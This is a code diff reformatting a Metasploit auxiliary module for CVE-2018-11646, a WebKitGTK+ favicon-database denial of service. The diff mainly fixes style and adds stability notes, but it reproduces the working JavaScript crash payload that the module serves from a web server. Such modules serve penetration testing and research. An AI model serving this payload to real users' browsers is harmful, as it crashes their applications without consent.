@@ -11,17 +11,17 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        'Name'           => "WebKitGTK+ WebKitFaviconDatabase DoS",
-        'Description'    => %q(
+        'Name' => 'WebKitGTK+ WebKitFaviconDatabase DoS',
+        'Description' => %q{
           This module exploits a vulnerability in WebKitFaviconDatabase when pageURL is unset.
           If successful, it could lead to application crash, resulting in denial of service.
-        ),
-        'License'        => MSF_LICENSE,
-        'Author'         => [
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Dhiraj Mishra', # Original discovery, disclosure
           'Hardik Mehta',  # Original discovery, disclosure
           'Zubin Devnani', # Original discovery, disclosure
-          'Manuel Caballero' #JS Code
+          'Manuel Caballero' # JS Code
         ],
         'References' => [
           ['EDB', '44842'],
@@ -30,9 +30,14 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://www.inputzero.io/2018/06/cve-2018-11646-webkit.html']
         ],
         'DisclosureDate' => '2018-06-03',
-        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],
+        'Actions' => [[ 'WebServer', { 'Description' => 'Serve exploit via web server' } ]],
         'PassiveActions' => [ 'WebServer' ],
-        'DefaultAction'  => 'WebServer'
+        'DefaultAction' => 'WebServer',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -42,14 +47,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def setup
-    @html = <<-JS
-<script type="text/javascript">
- win = window.open("WIN", "WIN");
- window.open("http://example.com/", "WIN");
- win.document.execCommand('stop');
- win.document.write("HelloWorld");
- win.document.close();
-</script>
+    @html = <<~JS
+      <script type="text/javascript">
+       win = window.open("WIN", "WIN");
+       window.open("http://example.com/", "WIN");
+       win.document.execCommand('stop');
+       win.document.write("HelloWorld");
+       win.document.close();
+      </script>
     JS
   end
 
